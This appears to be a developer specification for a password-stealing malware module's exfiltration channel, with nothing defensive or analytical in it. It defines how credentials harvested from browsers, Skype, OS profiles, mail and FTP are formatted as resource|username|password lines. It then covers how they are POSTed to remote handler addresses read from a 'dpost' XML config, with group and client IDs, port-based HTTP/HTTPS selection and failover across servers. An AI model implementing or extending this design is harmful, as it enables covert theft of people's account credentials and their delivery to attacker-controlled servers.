column1: Sentence
2 Data is sent to the server via HTTP POST requests.
There can be any number of reverse-proxy, load-balancer and DNAT between the server and the client.
Thus, there is no way to know the client's ip address.
2.1 Each request has three components in the URI separated by "/" - group tag, client id .
Each POST has a URI of the following format:
/<group-tag>/<clientid>/81/
where group-tag is the group tag, clientid is the client id, 81 is a code denoting the data type.
The group tag is an arbitrary string consisting of characters (a-z) and numbers (0-9).
The parameter is not case-sensitive.
The module gets it from higher-level logic (function Start, const ParentInfo* pParentData, pParentData->ParentGroup).
2.1.2 Client Id is a string.
The module gets it from the higher-level logic (function Start, const ParentInfo* pParentData, pParentData->ParentID
2.2 Each server response can be with the following HTTP codes: 200 and 403.

A 200 response always has a body with content "/1/" (content-type: text/plain), and a 403 response is used if the POST request is not POST, the POST body has an unknown format or fields, the URI has an unknown format, or the clientid has an incorrect format.
3 POST request has a body in multipart/form-data format.
And has the following fields:
source - description of the data source.
For example, if it is data from Skype, it should be something like "skype passwords", from OS - "OS passwords".
And so on and so forth.
data - long text in UTF8 encoding.
Each line is intended for a separate password, and consists of three fields separated by a vertical dash and ending with an end-of-line character \n:
resource|username|password\n
If passwords from browsers are collected, resource is the url.
For example, for a browser, the parcel could be something like this
http://gmx.com|jack|secretpassword\n
http://yahoo.com|jack1|secretpassword1\n
http://somesite.com|jack2|secretpassword2\n
Since passwords can be collected from different sources, the area field should contain the identifier of the resource protected by the password.
For Skype it will be
skype|jack|jackass\n
For OS - a separate string for each user's profile
os|jack|hijack\n
os|john|hijohn\n
for mail it will be the name of the pop3/imap server - if relevant and it can be grabbed; if not - just duplicate the mail address.
For ftp, it will be a url, like ftp://ftp.com.
etc.
3. Config with the list of addresses to send data to is given to the module by calling Control() with arguments:
Ctl = "dpost"
CtlArg = "config content"
3.1 The config is a simple xml in the following format:
<dpost>
<handler>http://11.22.33.44:8082</handler>
<handler>127.0.0.1:8083</handler>
</dpost>
The http/https prefix to the handler is optional.
If it is specified, the specified protocol should be used.
If it is not specified:
- if the port value is even, the operation is without encryption (HTTP), if the port is odd, the operation is over SSL/TLS (HTTPS).
3.2 Data sending is organized as follows:
- the first url from the list is selected
- the request uri is glued to it.
The final url will be (for the config given in the example), for example, like this
http://11.22.33.44:8082/group_id/client_id/81
- http-request is executed, server response is received
- if there was an error when executing the request (no server response, or the response code is not 200), the next url is selected from the config.
- in case of successful sending, the sending cycle is exited and the procedure is terminated.
- in case of unsuccessful sending to all the addresses given in the config, there are 2 options:
- pause for a minute, then retry
- cycle completion and procedure exit
This solution is left to the developer's discretion.
